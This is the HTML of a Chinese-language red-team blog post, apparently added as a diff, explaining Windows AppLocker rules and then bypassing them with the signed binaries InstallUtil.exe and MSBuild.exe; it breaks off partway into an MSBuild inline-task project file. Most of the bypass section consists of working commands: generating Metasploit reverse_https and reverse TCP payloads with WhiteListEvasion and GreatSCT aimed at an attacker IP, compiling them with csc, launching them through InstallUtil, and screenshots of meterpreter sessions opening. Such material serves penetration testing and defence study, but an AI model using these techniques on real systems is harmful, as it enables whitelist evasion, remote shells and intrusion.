@@ -1,0 +1,1793 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="cn">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+  
+  
+    
+      
+    
+    
+      
+    
+  <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+  <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-flash.min.css" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Monda:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+  
+
+<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.4.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.4.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.4.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="有的人浅薄，有的人金玉其表败絮其中。有一天 你会遇到一个彩虹般绚烂的人，当你遇到这个人后，会觉得其他人都只是浮云而已。  文章首发合天智汇，博客备份一个">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Applocker_Bypass">
+<meta property="og:url" content="https://lengjibo.github.io/appbypass/index.html">
+<meta property="og:site_name" content="冷逸的个人博客|开往安河桥北~">
+<meta property="og:description" content="有的人浅薄，有的人金玉其表败絮其中。有一天 你会遇到一个彩虹般绚烂的人，当你遇到这个人后，会觉得其他人都只是浮云而已。  文章首发合天智汇，博客备份一个">
+<meta property="og:locale" content="cn">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gbet4xvcapj30se0hsq4g.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gbetf0wtbqj30ru0j9glz.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gbetj8w82xj30lc0d4mxf.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gbetmtn677j30qn0ka74l.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gbetqd1x64j30np0lht9h.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBgy1gbev98uowkj30sl0gd0th.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gbg0oh3vacj30n80cumz8.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gbg12dzmdaj30lh04y0sm.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gbg17hk33bj30mb07b3yc.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gbg18gd7jmj30mb04xq2t.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gbg191grx1j30n406zt9u.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gbg1ue3368j30n507t75q.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBgy1gbg2uig7rlj30k005wdhn.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBgy1gbg31p9rinj30m008saa6.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBgy1gbg32m9bb9j30mi03lgm0.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBgy1gbg3gkgyddj30ll03wt8i.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBgy1gbg3ijniatj30m306y747.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gbh59gyghwj30my07cwfx.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gbh5fv438bj30z009yjsa.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gbh6e3p2l7j30ww0c7q3v.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gbh7qq1fokj30ml0cxdj2.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gbh7mcm29nj30h003474s.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gbh8bptnmyj30tu0he44d.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gbh8crr1wej30qc07r41i.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gbg191grx1j30n406zt9u.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gbjh6l46j4j30up0caglw.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBgy1gbji3pwlvtj30c101fwef.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBgy1gbjiidiqzcj30o00e3aj8.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBgy1gbjj1ainjej30p90gb77l.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBgy1gbjj4fdufzj30j006tt8k.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBgy1gbjj98pbqpj30vb09nq38.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBgy1gbjjbqcfudj30ol06c74d.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBgy1gbjjzz6wmmj30l80dvwj3.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBgy1gbjk3smpeyj30ko07jwgr.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gbkkveyidpj30if084t8x.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBgy1gbkl04xz4rj30ce08d0ti.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBgy1gbklidmmf7j31420jnn0d.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBgy1gbklqdtv4ij30lx0aojre.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBgy1gbkltrgjqdj30oy08hq2y.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBgy1gbkm5p28lpj30lo02o3z5.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBgy1gbkma6w26aj30pz0fkt98.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBgy1gbkoe7c4pcj30lm0cnt8s.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBgy1gbkomhfkp8j30uz0gxdgj.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBgy1gbkp63g048j30nn0c53yg.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBgy1gbkptlgrnnj30q20bq3yr.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBgy1gbkputkbjkj30m607mdhb.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gbkqodplkzj30mn0a0422.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gbkqrwdm1oj30nf02mgm4.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gbkr1orp8rj30pn0a974c.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gblqw0h4sgj30ne0djmxj.jpg">
+<meta property="og:updated_time" content="2020-02-21T02:58:46.674Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Applocker_Bypass">
+<meta name="twitter:description" content="有的人浅薄，有的人金玉其表败絮其中。有一天 你会遇到一个彩虹般绚烂的人，当你遇到这个人后，会觉得其他人都只是浮云而已。  文章首发合天智汇，博客备份一个">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gbet4xvcapj30se0hsq4g.jpg">
+
+
+
+  <link rel="alternate" href="/../../.deploy_git/atom.xml" title="冷逸的个人博客|开往安河桥北~" type="application/atom+xml" />
+
+
+
+
+  <link rel="canonical" href="https://lengjibo.github.io/appbypass/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Applocker_Bypass | 冷逸的个人博客|开往安河桥北~</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="cn">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">冷逸的个人博客|开往安河桥北~</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Home</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />About</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Categories</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archives</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-book">
+    <a href="/book/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-book"></i> <br />book</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://lengjibo.github.io/appbypass/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="冷逸">
+      <meta itemprop="description" content="做一个温柔的人...">
+      <meta itemprop="image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g7vony4ltaj308w08wq30.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="冷逸的个人博客|开往安河桥北~">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Applocker_Bypass
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2020-02-21 10:55:17 / Modified: 10:58:46" itemprop="dateCreated datePublished" datetime="2020-02-21T10:55:17+08:00">2020-02-21</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/RedTeam/" itemprop="url" rel="index"><span itemprop="name">RedTeam</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon"
+            >
+            <i class="fa fa-eye"></i>
+             Views:  
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>有的人浅薄，有的人金玉其表败絮其中。有一天 你会遇到一个彩虹般绚烂的人，当你遇到这个人后，会觉得其他人都只是浮云而已。</p>
+<hr>
+<p>文章首发合天智汇，博客备份一个</p>
+<a id="more"></a>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在提权中我们经常会遇到目标开启了Applocker的情况，本文将以<a href="https://github.com/api0cradle/UltimateAppLockerByPassList为参考，讲解Applocker的绕过技术。" target="_blank" rel="noopener">https://github.com/api0cradle/UltimateAppLockerByPassList为参考，讲解Applocker的绕过技术。</a></p>
+<p>这不仅仅是一个applocker的bypass文章，也是一个白名单利用文章。</p>
+<p>（若无特殊说明，实验环境一律为windows server 2012 r2）</p>
+<h2 id="什么是applocker"><a href="#什么是applocker" class="headerlink" title="什么是applocker"></a>什么是applocker</h2><p>AppLocker即“应用程序控制策略”，是Windows 7系统中新增加的一项安全功能。在win7以上的系统中默认都集成了该功能，我们可以使用在services中启用Application Identity，然后在local security policy中找到Application Control Policies中看到Applocker选项。</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gbet4xvcapj30se0hsq4g.jpg" alt="0.png"></p>
+<h3 id="applocker规则"><a href="#applocker规则" class="headerlink" title="applocker规则"></a>applocker规则</h3><p>默认的Applocker规则支持以下几种：</p>
+<table>
+<thead>
+<tr>
+<th>规则集合</th>
+<th>关联的文件格式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>可执行文件</td>
+<td>.exe、.com</td>
+</tr>
+<tr>
+<td>脚本</td>
+<td>.ps1、.bat、.cmd、.vbs、.js</td>
+</tr>
+<tr>
+<td>Windows Installer 文件</td>
+<td>.msi、.msp、.mst</td>
+</tr>
+<tr>
+<td>封装应用和封装应用安装程序</td>
+<td>.appx</td>
+</tr>
+<tr>
+<td>DLL 文件</td>
+<td>　.dll、.ocx</td>
+</tr>
+</tbody>
+</table>
+<p>.appx并不是所有的applocker都会存在，应根据windows版本来，在win10上，创建applocker规则后会在C:\Windows\System32\AppLocker生产相应的.applocker文件。</p>
+<h3 id="applocker规则条件"><a href="#applocker规则条件" class="headerlink" title="applocker规则条件"></a>applocker规则条件</h3><p>规则条件是用于帮助 AppLocker 标识要应用规则的应用的标准。三个主要规则条件为发布者、路径和文件哈希。</p>
+<ul>
+<li><p>发布者：基于应用的数字签名标识它</p>
+</li>
+<li><p>路径：通过应用在计算机文件系统中或网络上的位置来标识它</p>
+</li>
+<li><p>文件哈希：表示已标识文件的系统计算的加密哈希</p>
+</li>
+</ul>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gbetf0wtbqj30ru0j9glz.jpg" alt="1.png"></p>
+<h3 id="AppLocker-默认规则"><a href="#AppLocker-默认规则" class="headerlink" title="AppLocker 默认规则"></a>AppLocker 默认规则</h3><p>在你创建了一个applocker规则后，系统会默认询问你是否添加一条默认规则，如下图所示：</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gbetj8w82xj30lc0d4mxf.jpg" alt="2.png"></p>
+<p>每个规则所对应的默认规则如下：</p>
+<p>可执行的默认规则类型包括：</p>
+<ul>
+<li><p>允许本地 Administrators 组的成员运行所有应用。</p>
+</li>
+<li><p>允许 Everyone 组的成员运行 Windows 文件夹中的应用。</p>
+</li>
+<li><p>允许 Everyone 组的成员运行 Program Files 文件夹中的应用。</p>
+</li>
+</ul>
+<p>脚本默认规则类型包括：</p>
+<ul>
+<li><p>允许本地 Administrators 组的成员运行所有脚本。</p>
+</li>
+<li><p>允许 Everyone 组的成员运行 Program Files 文件夹中的脚本。</p>
+</li>
+<li><p>允许 Everyone 组的成员运行 Windows 文件夹中的脚本。</p>
+</li>
+</ul>
+<p>Windows Installer 默认规则类型包括：</p>
+<ul>
+<li><p>允许本地 Administrators 组的成员运行所有 Windows Installer 文件。</p>
+</li>
+<li><p>允许 Everyone 组的成员运行所有已进行数字签名的 Windows Installer 文件。</p>
+</li>
+<li><p>允许 Everyone 组的成员运行 Windows\Installer 文件夹中的所有 Windows Installer 文件。</p>
+</li>
+</ul>
+<p>DLL 默认规则类型：</p>
+<ul>
+<li><p>允许本地 Administrators 组的成员运行所有 DLL。</p>
+</li>
+<li><p>允许 Everyone 组的成员运行 Program Files 文件夹中的 DLL。</p>
+</li>
+<li><p>允许 Everyone 组的成员运行 Windows 文件夹中的 DLL。</p>
+</li>
+</ul>
+<p>封装应用默认规则类型：</p>
+<ul>
+<li>允许 Everyone 组的成员安装和运行所有已签名的封装应用和封装应用安装程序</li>
+</ul>
+<h3 id="AppLocker-规则行为"><a href="#AppLocker-规则行为" class="headerlink" title="AppLocker 规则行为"></a>AppLocker 规则行为</h3><p>可将规则配置为使用允许或拒绝操作：</p>
+<ul>
+<li><p><strong>允许。</strong>你可以指定允许在你的环境中运行的文件以及所针对的用户或用户组。你还可以配置例外以标识从规则中排除的文件。</p>
+</li>
+<li><p><strong>拒绝。</strong>你可以指定 not 允许在你的环境中运行的文件以及所针对的用户或用户组。你还可以配置例外以标识从规则中排除的文件。</p>
+</li>
+</ul>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gbetmtn677j30qn0ka74l.jpg" alt="3.png"></p>
+<h3 id="创建一个applocker规则"><a href="#创建一个applocker规则" class="headerlink" title="创建一个applocker规则"></a>创建一个applocker规则</h3><p>讲了那么多，我们以禁止在桌面上运行exe文件为例，创建一条规则。创建完大体如下：</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gbetqd1x64j30np0lht9h.jpg" alt="4.png"></p>
+<p>运行exe测试：</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBgy1gbev98uowkj30sl0gd0th.jpg" alt="5.png"></p>
+<p>系统就会阻止我们运行</p>
+<h2 id="bypass-Applocker"><a href="#bypass-Applocker" class="headerlink" title="bypass Applocker"></a>bypass Applocker</h2><h3 id="Installutil-exe"><a href="#Installutil-exe" class="headerlink" title="Installutil.exe"></a>Installutil.exe</h3><p>InstallUtil是.NET Framework的一部分，是一个命令行程序，它使用户可以通过命令提示符快速安装和卸载应用程序。由于此实用程序是Microsoft签名的二进制文件，因此可以用来绕过AppLocker限制来运行任何.NET可执行文件。该实用程序也位于Windows文件夹内，该文件夹不会应用AppLocker策略，因为需要执行Windows文件夹的内容才能使系统正常运行。</p>
+<p>首先我们使用WhiteListEvasion(<a href="https://github.com/khr0x40sh/WhiteListEvasion)生成一个模板" target="_blank" rel="noopener">https://github.com/khr0x40sh/WhiteListEvasion)生成一个模板</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python InstallUtil.py --cs_file pentestlab.cs</span><br><span class="line">--exe_file /root/Desktop/pentestlab.exe --payload</span><br><span class="line">windows/meterpreter/reverse_https --lhost 192.168.0.103 --lport 443</span><br></pre></td></tr></table></figure>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gbg0oh3vacj30n80cumz8.jpg" alt="6.png"></p>
+<p>上面的命令将生成一个C＃模板，其中将包含Metasploit ShellCode。</p>
+<p>将生成后的文件放到目标中使用下面的方法执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U /root/payload.exe</span><br></pre></td></tr></table></figure>
+<p>当然你也可以是先使用msf生成一个csharp的payload，然后替换模板中的shellcode，然后将cs文件传到目标机。</p>
+<p>然后用csc编译我们的脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe  /out:exeshell.exe exeshell.cs</span><br></pre></td></tr></table></figure>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gbg12dzmdaj30lh04y0sm.jpg" alt="7.png"></p>
+<p>此时我们执行我们的文件试试：</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gbg17hk33bj30mb07b3yc.jpg" alt="9.png"></p>
+<p>被规则拦截，那么我们使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U exeshell.exe</span><br></pre></td></tr></table></figure>
+<p>绕过</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gbg18gd7jmj30mb04xq2t.jpg" alt="10.png"></p>
+<p>msf成功上线</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gbg191grx1j30n406zt9u.jpg" alt="11.png"></p>
+<p>在msf中也有使用InstallUtil.exe进行applocker的bypass模块。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/local/applocker_bypass</span><br></pre></td></tr></table></figure>
+<p>原理是一样的</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gbg1ue3368j30n507t75q.jpg" alt="12.png"></p>
+<p>附带常见的路径：</p>
+<ul>
+<li>C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe</li>
+<li>C:\Windows\Microsoft.NET\Framework64\v2.0.50727\InstallUtil.exe</li>
+<li>C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe</li>
+<li>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe</li>
+</ul>
+<h3 id="Msbuild-exe"><a href="#Msbuild-exe" class="headerlink" title="Msbuild.exe"></a>Msbuild.exe</h3><p>MSBuild.exe（Microsoft Build Engine）是Visual Studio使用的软件构建平台。它采用XML格式的项目文件，这些文件定义了构建各种平台和配置的要求。（引用：MSDN MSBuild）</p>
+<p>我们可以使用MSBuild通过受信任的Windows实用工具代理代码执行。.NET版本4中引入的MSBuild内联任务功能允许将C＃代码插入XML项目文件中。内联任务MSBuild将编译并执行内联任务。MSBuild.exe是一个经过签名的Microsoft二进制文件，因此，以这种方式使用它时，它可以执行任意代码，并绕过配置为允许MSBuild.exe执行的应用程序白名单防护.</p>
+<p>我们这里直接使用GreatSCT生成一个xml文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./GreatSCT.py --ip 192.168.0.106 --port 4444 -t bypass -p msbuild/meterpreter/rev_tcp.py</span><br></pre></td></tr></table></figure>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBgy1gbg2uig7rlj30k005wdhn.jpg" alt="13.png"></p>
+<p>并且会给我们生成一个rc文件，我们可以使用msfconsole -r 直接启动msf</p>
+<p>然后使用msbuild执行，</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBgy1gbg31p9rinj30m008saa6.jpg" alt="14.png"></p>
+<p>msf上线：</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBgy1gbg32m9bb9j30mi03lgm0.jpg" alt="15.png"></p>
+<p>当然你也可以是使用msf生成一个c#的shellcode然后使用三好学生师傅的模板加载：</p>
+<p><a href="https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml" target="_blank" rel="noopener">https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml</a></p>
+<p>注意将后缀名改为.csproj</p>
+<p>除了反弹shell以外我们还可以用它来绕过powershell的限制。</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBgy1gbg3gkgyddj30ll03wt8i.jpg" alt="16.png"></p>
+<p>代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">&lt;Project ToolsVersion=&quot;4.0&quot; xmlns=&quot;http://schemas.microsoft.com/developer/msbuild/2003&quot;&gt;</span><br><span class="line">  &lt;!-- This inline 